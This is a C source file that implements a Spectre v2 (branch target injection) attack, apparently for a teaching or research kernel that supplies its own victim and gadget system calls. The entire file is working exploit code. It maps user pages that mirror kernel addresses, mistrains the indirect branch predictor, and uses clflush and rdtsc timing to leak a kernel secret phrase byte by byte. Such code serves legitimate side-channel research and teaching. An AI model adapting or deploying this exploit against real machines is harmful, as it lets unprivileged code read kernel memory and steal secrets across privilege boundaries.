/*
  Reads kernel memory using spectre v2. This code works with kernel/sysattack.cc

  General approach:
  - The functions dummy_victim and dummy_gadget are memcpy'd to the same addresses
    (minus the top kernel bit of the virtual address) as sys_spectre_victim and
    gadget, which are defined in sysattack.cc, respectively.
  - Dummy_victim contains an indirect call that is approximately at the same address
    as the indirect call in sys_spectre_victim. Dummy_victim is repeatedly called
    such that the indirect call jumps to dummy_gadget.
  - When sys_spectre_victim is called, the target of the indirect call will
    be mispredicted to gadget, which reads kernel memory into the side channel.
 */

#pragma GCC push_options
#pragma GCC optimize ("O0")

#include <stdio.h>
#include "types.h"
#include "user.h"

#include <uk/mman.h>
#include <uk/asm.h>
#include <cstring>
#include <stdlib.h>
#include "amd64.h"

#define PRINT_DEBUG false

#define USER_MASK ((1ull << 47) - 1) // 4 level paging => 48 bit va, top bit is kernel/user
#define PAGE_BITS 12
#define PAGE_SIZE (1ull << PAGE_BITS)
#define PAGE_INDEX_MASK ~((1ull << PAGE_BITS) - 1)

#define CACHE_HIT_THRESHOLD 80
#define GAP 1024

// mimic the safe target
__attribute__((noinline))
int
dummy_gadget(void)
{
  return 3;
}

// mimic the victim
__attribute__((noinline))
int
dummy_victim(u8 *channel, u64 dest, int input)
{
  int junk = 0;
  // set up bhb by performing >29 taken branches
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }

  // use nops to get the offsets between user and kernel to match
  int result;
  __asm volatile("nop\nnop\nnop\nnop\nnop\n"
                 "nop\nnop\nnop\nnop\nnop\n"
                 "callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (dest)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
  result &= (u64)channel;
  result &= ((u64)(channel) >> 32);
  return result & junk & ((u64)channel);
}

void*
mmap_two_pages(u64 addr)
{
  return mmap((void*) (addr & PAGE_INDEX_MASK),
              PAGE_SIZE * 2, // map 2 pages just in case we're close to boundary
              PROT_READ | PROT_WRITE,
              MAP_ANONYMOUS,
              0, 0);
}

int (*uv)(u8*, u64, int); // memcpy'd dummy_victim
u64 uga; // address of memcpy'd dummy_gadget

// see appendix C of https://spectreattack.com/spectre.pdf
int
readByte(char *addrToRead, char result[2])
{
  u8 *channel = (u8*) malloc(256 * GAP * sizeof(u8));
  int hits[256]; // record cache hits
  int tries, i, j, k, mix_i, junk = 0;
  u64 start, elapsed;
  volatile u8 *addr;

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 1;
  }

  for (tries = 999; tries > 0; tries--) {
    // poison branch predictor
    for (j = 50; j > 0; j--) {
      junk ^= uv(channel, uga, 0);
    }
    mfence();

    // flush side channel
    for (i = 0; i < 256; i++)
      clflush(&channel[i * GAP]);
    mfence();

    // flush actual target
    spectre_flush_target();
    mfence();

    // call victim
    junk ^= spectre_victim(channel, (u8*)addrToRead, 0);
    mfence();

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = rdtsc();
      junk ^= *addr;
      mfence(); // make sure read completes before we check the timer
      elapsed = rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }
  }

  // locate top two results
  j = k = -1;
  for (i = 0; i < 256; i++) {
    if (PRINT_DEBUG && hits[i] > 0)
      printf("hit %d: %d\n", i, hits[i]);

    if (j < 0 || hits[i] >= hits[j]) {
      k = j;
      j = i;
    } else if (k < 0 || hits[i] >= hits[k]) {
      k = i;
    }
  }
  if ((hits[j] >= 2 * hits[k] + 5) ||
      (hits[j] == 2 && hits[k] == 0)) {
    result[0] = (char)j;
    result[1] = 1;
  } else {
    result[0] = 0;
    result[1] = 0;
  }

  free(channel);
  return junk; // prevent junk from being optimized out
}

int
main(int argc, char *argv[])
{
  u64 kva = spectre_get_victim_addr(); // need to mistrain this call
  u64 kga = spectre_get_gadget_addr(); // to predict here
  if (PRINT_DEBUG)
    printf("kva: 0x%lx, kga: 0x%lx\n", kva, kga);

  int kvoffset = spectre_get_victim_call_offset(); // offset to call instruction
  if (PRINT_DEBUG)
    printf("kvoffset: %d\n", kvoffset);

  int uvoffset;
  u8 *code = (u8*) &dummy_victim;
  for (uvoffset = 0; *(code + uvoffset) != 0xff; uvoffset++);
  if (PRINT_DEBUG)
    printf("uvoffset: %d\n", uvoffset);

  if (PRINT_DEBUG && kvoffset != uvoffset) // offsets just have to be close enough
    printf("kernel and user offsets don't match\n");

  u64 uva = (kva & USER_MASK) + kvoffset - uvoffset;
  if (PRINT_DEBUG)
    printf("uva: 0x%lx\n", uva);

  if (mmap_two_pages(uva) == MAP_FAILED) {
    printf("mmap uva failed\n");
    return 1;
  }

  uga = kga & USER_MASK;
  if (PRINT_DEBUG)
    printf("uga: 0x%lx\n", uga);

  if (mmap_two_pages(uga) == MAP_FAILED) {
    printf("mmap uga failed\n");
    return 1;
  }

  // size should be larger than function
  void* dest = memcpy((void*) uva, (void*) &dummy_victim, 160);
  if ((u64)dest != uva) {
    printf("memcpy uva failed\n");
    return 1;
  }

  // don't copy too much or else it will overwrite uva
  dest = memcpy((void*) uga, (void*) &dummy_gadget, 20);
  if ((u64)dest != uga) {
    printf("memcpy uga failed\n");
    return 1;
  }

  uv = ((int (*)(u8*, u64, int)) uva);

  int secret_len;
  u64 secret_addr = spectre_get_secret_addr(&secret_len);

  int junk = 0;
  char result[2]; // result[0] is the char, result[1] == 1 if char is valid
  int index = 0;

  printf("Reading secret phrase: ");
  while (index < secret_len) {
    junk += readByte(((char*) secret_addr) + index, result);
    if (result[1] == 1) {
      if (result[0] == 0)
        break;
      printf("%c", result[0]);
    } else {
      printf("?");
    }
    index++;
  }
  printf("\ndone! (junk: %d)\n", junk);
  return 0;
}

#pragma GCC pop_options
